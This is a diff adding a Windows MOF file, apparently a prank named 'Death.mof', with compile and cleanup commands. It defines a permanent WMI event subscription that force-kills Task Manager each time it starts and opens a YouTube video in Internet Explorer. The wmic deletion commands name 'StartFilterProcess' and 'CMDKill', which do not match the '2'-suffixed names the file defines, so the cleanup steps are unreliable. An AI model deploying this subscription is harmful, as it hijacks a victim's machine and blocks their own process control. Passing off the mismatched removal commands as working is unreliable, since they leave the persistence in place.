@@ -1,0 +1,37 @@
+Compile mof file:
+
+mofcomp Death.mof
+
+To delete __EventFilter:
+
+wmic /namespace:"\\root\subscription" PATH __EventFilter WHERE Name="StartFilterProcess" DELETE
+
+To delete a CommandLineEventConsumer:
+
+wmic /namespace:"\\root\subscription" PATH CommandLineEventConsumer WHERE Name="CMDKill" DELETE
+
+
+
+
+instance of __FilterToConsumerBinding as $Start2
+{
+   Filter = $FiltStart2;
+   Consumer = $ConsStart2;
+};
+
+
+instance of CommandLineEventConsumer as $ConsStart2
+{
+   Name = "CMDKill2";
+   CommandLineTemplate = "cmd.exe /c \"taskkill /f /t /im taskmgr* & \"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\" https://www.youtube.com/watch?v=66tQR7koR_Q\"";
+ 
+};
+
+instance of __EventFilter as $FiltStart2
+{
+   Name = "StartFilterProcess2";
+   Query = "SELECT * FROM Win32_ProcessStartTrace "
+       "WHERE ProcessName LIKE \"%taskmgr%\"";
+   QueryLanguage = "WQL";
+   EventNameSpace = "root\\cimv2";
+};
